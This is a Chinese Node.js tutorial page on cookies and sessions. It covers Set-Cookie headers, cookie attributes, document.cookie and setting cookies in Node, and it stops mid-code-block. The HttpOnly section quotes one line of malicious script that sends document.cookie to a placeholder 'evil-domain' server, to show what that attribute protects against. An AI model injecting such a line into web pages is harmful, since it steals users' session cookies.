<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>第11章 会话保持 | nodejs 入门教程</title>
    <meta name="description" content="持续更新中...">
    
    
    <link rel="preload" href="/assets/css/0.styles.382af5d5.css" as="style"><link rel="preload" href="/assets/js/app.8174091a.js" as="script"><link rel="preload" href="/assets/js/5.5ba4cb83.js" as="script"><link rel="prefetch" href="/assets/js/10.5b11cab0.js"><link rel="prefetch" href="/assets/js/11.bf1f3f16.js"><link rel="prefetch" href="/assets/js/12.d6508346.js"><link rel="prefetch" href="/assets/js/13.52f6c1ad.js"><link rel="prefetch" href="/assets/js/14.c75697e3.js"><link rel="prefetch" href="/assets/js/15.775c8708.js"><link rel="prefetch" href="/assets/js/16.10809650.js"><link rel="prefetch" href="/assets/js/17.60279c5d.js"><link rel="prefetch" href="/assets/js/18.421777c3.js"><link rel="prefetch" href="/assets/js/19.960356be.js"><link rel="prefetch" href="/assets/js/2.0e940fbb.js"><link rel="prefetch" href="/assets/js/20.4c2a40dc.js"><link rel="prefetch" href="/assets/js/21.73a1e8cb.js"><link rel="prefetch" href="/assets/js/3.07be1171.js"><link rel="prefetch" href="/assets/js/4.7a89c0f9.js"><link rel="prefetch" href="/assets/js/6.b7415607.js"><link rel="prefetch" href="/assets/js/7.719e35e5.js"><link rel="prefetch" href="/assets/js/8.d8593f62.js"><link rel="prefetch" href="/assets/js/9.52f01050.js">
    <link rel="stylesheet" href="/assets/css/0.styles.382af5d5.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">nodejs 入门教程</span></a> <div class="links" style="max-width:nullpx;"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="http://liuyang.feblog.cn" target="_blank" rel="noopener noreferrer" class="nav-link external">
  刘洋博客
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">学习文档</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="http://js.feblog.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  javascript
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://vuejs.feblog.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  vuejs
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <a href="https://github.com/thisliuyang/nodejs-tutorial" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="http://liuyang.feblog.cn" target="_blank" rel="noopener noreferrer" class="nav-link external">
  刘洋博客
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">学习文档</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="http://js.feblog.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  javascript
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://vuejs.feblog.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  vuejs
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <a href="https://github.com/thisliuyang/nodejs-tutorial" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav>  <ul class="sidebar-links"><li><a href="/00-course_introduction.html" class="sidebar-link">Nodejs</a></li><li><a href="/01-web_concept.html" class="sidebar-link">第1章 服务端开发基础</a></li><li><a href="/02-node_introduction.html" class="sidebar-link">第2章 Node.js 介绍</a></li><li><a href="/03-getting_started.html" class="sidebar-link">第3章 起步</a></li><li><a href="/04-module.html" class="sidebar-link">第4章 模块系统</a></li><li><a href="/05-package_npm.html" class="sidebar-link">第5章 包与npm</a></li><li><a href="/06-fs.html" class="sidebar-link">第6章 文件操作</a></li><li><a href="/07-web.html" class="sidebar-link">第7章 Web 开发</a></li><li><a href="/08-express.html" class="sidebar-link">第8章 使用 Express 快速进行 Web 开发</a></li><li><a href="/09-db.html" class="sidebar-link">第9章 数据库</a></li><li><a href="/10-web_db.html" class="sidebar-link">第10章 使用数据库存储网站数据</a></li><li><a href="/11-session_persistence.html" class="active sidebar-link">第11章 会话保持</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/11-session_persistence.html#概述" class="sidebar-link">概述</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#cookie-与-http-协议" class="sidebar-link">Cookie 与 HTTP 协议</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/11-session_persistence.html#http-回应：cookie-的生成" class="sidebar-link">HTTP 回应：Cookie 的生成</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#http-请求：cookie-的发送" class="sidebar-link">HTTP 请求：Cookie 的发送</a></li></ul></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#cookie-的属性" class="sidebar-link">Cookie 的属性</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/11-session_persistence.html#expires，max-age" class="sidebar-link">Expires，Max-Age</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#domain，path" class="sidebar-link">Domain，Path</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#secure，httponly" class="sidebar-link">Secure，HttpOnly</a></li></ul></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#在浏览器中操作-cookie" class="sidebar-link">在浏览器中操作 Cookie</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/11-session_persistence.html#document-cookie" class="sidebar-link">document.cookie</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#js-cookie" class="sidebar-link">js-cookie</a></li></ul></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#在-node-中操作-cookie" class="sidebar-link">在 Node 中操作 Cookie</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/11-session_persistence.html#设置cookie" class="sidebar-link">设置cookie</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#读取cookie" class="sidebar-link">读取cookie</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#cookie有效期" class="sidebar-link">cookie有效期</a></li></ul></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#session" class="sidebar-link">Session</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/11-session_persistence.html#session介绍" class="sidebar-link">session介绍</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#设置-读取session" class="sidebar-link">设置/读取session</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#session有效期" class="sidebar-link">session有效期</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#删除session" class="sidebar-link">删除session</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#session-的有效范围" class="sidebar-link">session 的有效范围</a></li></ul></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#cookie-和-session-的原理" class="sidebar-link">Cookie 和 Session 的原理</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/11-session_persistence.html#cookie原理" class="sidebar-link">cookie原理</a></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#session原理" class="sidebar-link">session原理</a></li></ul></li><li class="sidebar-sub-header"><a href="/11-session_persistence.html#参考资料" class="sidebar-link">参考资料</a></li></ul></li><li><a href="/12-ajax.html" class="sidebar-link">第12章 Ajax</a></li><li><a href="/13-alibaixiu.html" class="sidebar-link">第13章  阿里百秀综合案例</a></li><li><a href="/14-asynchronous_ programming.html" class="sidebar-link">第14章 异步编程</a></li><li><a href="/15-dep_ops.html" class="sidebar-link">第15章 部署与运维</a></li><li><a href="/16-other.html" class="sidebar-link">第16章 其他</a></li></ul> </div> <div class="page"> <div class="content"><h1 id="第11章-会话保持"><a href="#第11章-会话保持" aria-hidden="true" class="header-anchor">#</a> 第11章 会话保持</h1> <h2 id="概述"><a href="#概述" aria-hidden="true" class="header-anchor">#</a> 概述</h2> <p>Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p> <p>Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。</p> <ul><li>对话（session）管理：保存登录、购物车等需要记录的信息。</li> <li>个性化：保存用户的偏好，比如网页的字体大小、背景色等等。</li> <li>追踪：记录和分析用户行为。</li></ul> <p>有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。</p> <p>Cookie 包含以下几方面的信息。</p> <ul><li>Cookie 的名字</li> <li>Cookie 的值（真正的数据写在这里面）</li> <li>到期时间</li> <li>所属域名（默认是当前域名）</li> <li>生效的路径（默认是当前网址）</li></ul> <p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含<code>www.example.com</code>这个域名，以及根路径<code>/</code>。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。</p> <p>浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p> <div class="language- extra-class"><pre class="language-text"><code>// 浏览器是否打开 Cookie 功能
window.navigator.cookieEnabled // true
</code></pre></div><p><code>document.cookie</code>属性返回当前网页的 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>// 当前网页的 Cookie
document.cookie
</code></pre></div><p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p> <p>浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>读取。</p> <h2 id="cookie-与-http-协议"><a href="#cookie-与-http-协议" aria-hidden="true" class="header-anchor">#</a> Cookie 与 HTTP 协议</h2> <p>Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。</p> <h3 id="http-回应：cookie-的生成"><a href="#http-回应：cookie-的生成" aria-hidden="true" class="header-anchor">#</a> HTTP 回应：Cookie 的生成</h3> <p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie:foo=bar
</code></pre></div><p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p> <p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p> <div class="language- extra-class"><pre class="language-text"><code>HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
</code></pre></div><p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly
</code></pre></div><p>上面的几个属性的含义，将在后文解释。</p> <p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly
</code></pre></div><p>下面是一个例子。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
</code></pre></div><p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: key1=value1; domain=example.com; path=/blog
</code></pre></div><p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: key1=value2; domain=example.com; path=/blog
</code></pre></div><p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: key1=value2; domain=example.com; path=/
</code></pre></div><p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>Cookie: key1=value1; key1=value2
</code></pre></div><p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p> <h3 id="http-请求：cookie-的发送"><a href="#http-请求：cookie-的发送" aria-hidden="true" class="header-anchor">#</a> HTTP 请求：Cookie 的发送</h3> <p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p> <div class="language- extra-class"><pre class="language-text"><code>Cookie: foo=bar
</code></pre></div><p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p> <p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p> <div class="language- extra-class"><pre class="language-text"><code>Cookie: name=value; name2=value2; name3=value3
</code></pre></div><p>下面是一个例子。</p> <div class="language- extra-class"><pre class="language-text"><code>GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
</code></pre></div><p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p> <ul><li>Cookie 的各种属性，比如何时过期。</li> <li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li></ul> <h2 id="cookie-的属性"><a href="#cookie-的属性" aria-hidden="true" class="header-anchor">#</a> Cookie 的属性</h2> <h3 id="expires，max-age"><a href="#expires，max-age" aria-hidden="true" class="header-anchor">#</a> Expires，Max-Age</h3> <p><code>Expires</code>属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
</code></pre></div><p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p> <p><code>Max-Age</code>属性指定从现在开始 Cookie 存在的秒数，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p> <p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p> <p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p> <h3 id="domain，path"><a href="#domain，path" aria-hidden="true" class="header-anchor">#</a> Domain，Path</h3> <p><code>Domain</code>属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，<code>example.com</code>不设置 Cookie 的<code>domain</code>属性，那么<code>sub.example.com</code>将不会附带这个 Cookie。如果指定了<code>domain</code>属性，那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。</p> <p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>PATH</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是域名必须一致。</p> <h3 id="secure，httponly"><a href="#secure，httponly" aria-hidden="true" class="header-anchor">#</a> Secure，HttpOnly</h3> <p><code>Secure</code>属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p> <p><code>HttpOnly</code>属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;
</code></pre></div><p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p> <h2 id="在浏览器中操作-cookie"><a href="#在浏览器中操作-cookie" aria-hidden="true" class="header-anchor">#</a> 在浏览器中操作 Cookie</h2> <h3 id="document-cookie"><a href="#document-cookie" aria-hidden="true" class="header-anchor">#</a> document.cookie</h3> <p><code>document.cookie</code>属性用于读写当前网页的 Cookie。</p> <p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie // &quot;foo=bar;baz=bar&quot;
</code></pre></div><p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p> <div class="language- extra-class"><pre class="language-text"><code>var cookies = document.cookie.split(';');

for (var i = 0; i &lt; cookies.length; i++) {
  console.log(cookies[i]);
}
// foo=bar
// baz=bar
</code></pre></div><p><code>document.cookie</code>属性是可写的，可以通过它为当前网站添加 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = 'fontSize=14';
</code></pre></div><p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p> <p>但是，<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = 'test1=hello';
document.cookie = 'test2=world';
document.cookie
// test1=hello;test2=world
</code></pre></div><p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p> <p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = &quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;;
</code></pre></div><p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p> <p>各个属性的写入注意点如下。</p> <ul><li><code>path</code>属性必须为绝对路径，默认为当前路径。</li> <li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li> <li><code>max-age</code>属性的值为秒数。</li> <li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li></ul> <p><code>document.cookie</code>写入 Cookie 的例子如下。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = 'fontSize=14; '
  + 'expires=' + someDate.toGMTString() + '; '
  + 'path=/subdirectory; '
  + 'domain=*.example.com';
</code></pre></div><p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p> <p>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
</code></pre></div><p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p> <h3 id="js-cookie"><a href="#js-cookie" aria-hidden="true" class="header-anchor">#</a> js-cookie</h3> <blockquote><p>https://github.com/js-cookie/js-cookie</p></blockquote> <h2 id="在-node-中操作-cookie"><a href="#在-node-中操作-cookie" aria-hidden="true" class="header-anchor">#</a> 在 Node 中操作 Cookie</h2> <h3 id="设置cookie"><a href="#设置cookie" aria-hidden="true" class="header-anchor">#</a> 设置cookie</h3> <ul><li>核心： ==cookie是随着响应头返回给浏览器的==</li> <li>设置cookie的核心思想： 使用 res.setHeader 或者 writeHeader 将cookie信息设置在响应头中</li> <li>cookie设置格式：key=value;expires=time
<ul><li>key: cookie的名称</li> <li>value： 名称对应的值</li> <li>expires： 有效期</li></ul></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//1. 使用 setHeader 方法</span>
res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'set-cookie'</span><span class="token punctuation">,</span> <span class="token string">'id=101'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">//设置单个cookie</span>
res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'set-cookie'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'id=101'</span><span class="token punctuation">,</span> <span class="token string">'name=zs'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//设置多个cookie</span>

<span class="token comment">//2. 使用 writeHeader 方法</span>
res<span class="token punctuation">.</span><span class="token function">writeHeader</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token string">'content-type'</span><span class="token punctuation">:</span> <span class="token string">'text/html;charset=utf-8'</span><span class="token punctuation">,</span>
    <span class="token string">'set-cookie'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'type=10'</span><span class="token punctuation">,</span> <span class="token string">'name=my'</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>；

<span class="token comment">//3. 使用 set 方法，该方法是express封装的方法</span>
res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'set-cookie'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'goodsName=xiaomi 6'</span><span class="token punctuation">,</span> <span class="token string">'goodsPrice=3999'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>；

<span class="token comment">//4. 设置cookie时，指定有效期</span>
<span class="token comment">//注意：要使用UTC时间，使用 toUTCString()方法转换</span>
<span class="token comment">//设置有效期为 1小时</span>
<span class="token keyword">const</span> expiresTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUTCString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
